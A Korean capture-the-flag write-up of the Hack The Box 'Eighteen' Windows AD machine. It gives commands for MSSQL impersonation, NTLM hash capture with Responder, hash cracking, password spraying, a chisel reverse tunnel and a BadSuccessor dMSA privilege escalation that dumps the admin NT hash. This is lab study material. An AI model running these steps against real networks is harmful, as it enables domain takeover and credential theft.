# HTB-EIGHTEEN
```bash
OS: Windows(AD)
DATE: 26.11.06
DIFFICULTY: Easy
```

## RECON
초기 정찰 전 먼저 크레덴셜 하나를 받고 머신을 시작하였다. kevin / iNa2we6haRj2gaw! 이제 nmap을 통해 전체 포트 검사와 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 80,1433,5985 IP | tee nmap
```
포트 검사 결과 80(HTTP), 1433(MSSQL), 5985(WINRM) 서비스가 동작하는 것을 알게 되었다. 먼저 초기 크레덴셜로 MSSQL에 접속이 가능한지 확인해 보았다.
```bash
nxc mssql IP -u kevin -p 'iNa2we6haRj2gaw!' --local-auth
```
확인 결과 도메인 크레덴셜은 아니고 MSSQL에서만 작동하는 크레덴셜인 것을 알게 되었다. 이제 접속해 보았다.
```bash
mssqlclient.py eighteen.htb/kevin:'iNa2we6haRj2gaw!'@IP

sql > SELECT name FROM sys.databases;
master              
tempdb              
model               
msdb                
financial_planner
sql > USE financial_planner;
The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
```
접속 후 DB를 확인하니 `financial_planner`라는 DB가 있어 접속을 시도하였지만 불가능하였다. 이후 HTTP 서비스에 접근한 후 웹 디렉터리 및 서브도메인 FUZZING을 진행하였다.
```bash
ffuf -u http://eighteen.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r -c
```
```bash
ffuf -u http://eighteen.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -c -e .php,.txt,.asp,.aspx
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://eighteen.htb/ -H "Host: FUZZ.eighteen.htb" -fs 143
```
FUZZING 결과 `admin, login, register` 등의 웹 디렉터리가 나왔다. 서브도메인은 발견하지 못했다.

## Initial Access
이제 HTTP 서비스를 간단히 정찰해 보았다. 초기에 주어진 크레덴셜로 로그인이 가능한지 확인해 보았지만 불가능하였다. 따라서 다시 한번 MSSQL로 돌아와 열거를 진행하였다. 먼저 `xp_dirtree`로 SMB를 통해 서비스 계정의 NTLM 해시를 얻을 수 있는지 확인해 보았다.
```sql
sql > exec master..xp_dirtree //IP/share/test
```
```bash
sudo responder -I tun0

[SMB] NTLMv2-SSP Hash     : mssqlsvc::EIGHTEEN:98480665965cd96a:31B3C632BE504C4499C4BA0DE2E5336A:010100000000000080EA11C1E86DDD0194E00CE63A33ACED0000000002000800560045
```
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
확인 결과 mssqlsvc 서비스 계정의 해시를 얻었지만 hashcat으로 크랙이 불가능하였다. 따라서 다른 방향으로 돌렸다. 이제 MSSQL에서 어떤 유저와 링크되어 있는지 확인해 보았다.
```sql
sql > enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
LOGIN                   IMPERSONATE       GRANT        kevin     appdev
```
확인 결과 grantee가 현재 내 유저(kevin)이고 grantor가 appdev라는 다른 유저였다. 그리고 권한이 **IMPERSONATE**로 연결되어 있어 kevin이 appdev로 둔갑이 가능한 것이었다. 따라서 `EXECUTE AS LOGIN` 내부 명령어로 유저를 교체해서 들어가 보았다.
```sql
sql > EXECUTE AS LOGIN appdev
```
이제 유저가 appdev로 바뀌어, 다시 한번 아까 접근하지 못하였던 `financial_planner` DB에 접근해 보았다.
```sql
sql > USE financial_planner;
sql > SELECT table_name FROM information_schema.tables;
table_name    
-----------   
users         
incomes       
expenses      
allocations   
analytics     
visits      
```
테이블을 확인해 본 결과 users라는 테이블이 있어 출력해 보았다.
```sql
sql > SELECT * FROM users;
  id   full_name         username          email                password_hash                                                                                            is_admin   created_at   
----   ---------------   ---------------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin             admin             admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03
```
이제 HTTP 서비스의 admin 계정으로 보이는 유저의 password hash를 얻게 되었다. 이 hash는 pbkdf2:sha256 형식으로 hashcat mode 10900으로 크랙이 가능하였다. 따라서 바로 크랙을 진행하였다.
```bash
hashcat -m 10900 hash2 /usr/share/wordlists/rockyou.txt
```
하지만 형식이 맞지 않는다고 크랙이 불가능하였다. 따라서 다시 한번 확인해 본 결과, hashcat의 **PBKDF2-HMAC-SHA256** 모드는 해시를 정해진 형식으로 받았다. 형식은 다음과 같다.
```bash
sha256:<iterations>:<salt를_base64>:<hash를_base64>
```
따라서 크랙이 불가능했던 것이다. 이제 salt와 hash를 모두 base64로 인코딩해 준 후 다시 진행하였다.
```bash
echo -n "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133" | xxd -r -p | base64
```
```bash
echo -n "AMtzteQIG7yAbZIa" | base64
```
```bash
hashcat -m 10900 real_hash /usr/share/wordlists/rockyou.txt
```
그 결과 `iloveyou1`이라는 평문 비밀번호가 나왔다. 이제 이것으로 HTTP에 접속하여 admin 유저로 로그인해 보았지만 특별한 정보는 얻을 수 없었다. 따라서 nxc를 사용하여 MSSQL SID를 빼보았다.
```bash
nxc mssql -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```
나온 유저로 users라는 파일을 만들어 주고, 아까 크랙한 비밀번호로 password spray를 진행하였다.
```bash
nxc winrm -u users -p iloveyou1 --continue-on-success
```
그 결과 **adam.scott**이라는 유저의 크레덴셜을 얻을 수 있었다. 이제 winrm으로 접속 후 user flag를 얻을 수 있었다.

![user](attach_real/Pasted%20image%2020261106121805.png)

## Privilege Escalation
이제 권한 상승을 위해 많은 경로를 시도해 보았다. 먼저 **SharpHound.exe**를 사용하여 내부 정보를 뽑고 bloodhound를 돌려보았다. 돌려본 결과 outbound는 아무것도 없었다. 따라서 winpeas도 돌려보고 여러 가지를 시도하였다. 그중 `systeminfo` 명령어를 사용하여 OS 버전을 확인해 주었다. 확인 결과 **Windows Server 2025** OS였다. 이 OS는 비교적 새로 나온 버전이기 때문에 관련 Exploit이 있는지 찾아보았다.

찾아본 결과, 대상 OS의 신기능인 `dMSA`는 낡은 서비스 계정을 새롭고 안전한 dMSA로 교체하려는 것이다. 마이그레이션의 정상 기능은, 서비스가 끊기지 않게 하던 일을 그대로 해야 하고 모든 권한, 심지어 암호 키까지 물려받는 것이다. 하지만 여기서 AD는 마이그레이션 된 것을 거창하게 검증하지 않고 딱 두 개의 속성만 보고 판단한다. `msDS-ManagedAccountPrecededByLink`와 `msDS-DelegatedMSAState`이다. 여기서 취약점은, 이 두 속성에 쓰기 권한이 있으면 마이그레이션을 위조할 수 있다는 것이다. 이 두 속성에 거짓으로 적는다면 AD는 검증 없이 믿고 admin의 권한과 키를 새로운 dMSA에게 넘긴다. 따라서 **badsuccessor** 취약점이 있는지 `Get-BadSuccessorOUPermissions.ps1`를 사용하여 확인해 보았다.
```ps1
. .\Get-BadSuccessorOUPermissions.ps1
```
```ps1
Get-BadSuccessorOUPermissions
Identity    OUs
--------    ---
EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
```
확인 결과 IT 그룹이 OU=Staff에 dMSA 생성 권한을 보유하였다. 이건 운이 아니라 잘못된 권한 위임으로 생긴 일이기 때문에 공격 조건이 충족되었다. 따라서 dMSA를 생성하여 거짓 속성을 심어 보기 위해, 먼저 chisel을 넣어 주고 프록시 체인을 사용하여 DC를 조작하였다.
```bash
./chisel server -p 9999 --reverse --socks5
```
```ps1
.\chisel.exe client IP:9999 R:socks
```
```bash
proxychains4 bloodyAD -d eighteen.htb -u adam.scott -p 'iloveyou1' -H IP -i IP add badSuccessor --prepatch websvc2

dMSA current keys found in TGS:
AES256: cbf966a2d6fb5b1c590e3b1ec570637c806a6843395587c176f9ea02fa6ba01b
AES128: 7fa1ccf5ec5af229c1a775678d38a805
RC4: 26a15f331da45db42beb754dc780e571

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: 0b133be956bfaddf9cea56701affddec
```
여기서 위의 키들은 가짜 계정(websvc2)의 것이고, 밑에 있는 것이 진짜 어드민의 NT hash(RC4 키)다. 이로써 admin의 NT hash를 얻게 되어 쉘에 접속해서 root flag를 얻게 되었다.

![admin](attach_real/Pasted%20image%2020261106124354.png)

## New Inform
- 항상 NTLM 해시가 크랙될 거라는 생각을 버리자
- MSSQL에서 `enum_impersonate`로 유저끼리 IMPERSONATE 관계로 엮여 있으면 `EXECUTE AS LOGIN`으로 다른 유저로 사칭이 가능하다
- nxc를 사용하여 mssql, wmi 등에서 --rid-brute로 유저를 뽑을 수 있다
- 만약 리눅스에서 bloodhound를 돌리지 못하면 **SharpHound.exe**를 사용하여 쉘 안에서 돌릴 수 있다
- Windows Server 2025를 보면 dMSA를 떠올리자
- dMSA 취약점 요약: 권한 확인을 두 속성만 보고 한다. 여기서 만약 그 속성에 쓰기 권한이 있다면 가짜로 생성하여 거짓으로 만들 수 있음
- powershell에서 스크립트를 불러올 때 앞에 `.`(dot sourcing)을 사용해야 함
- DC에 접근하지 못하여 Chisel 사용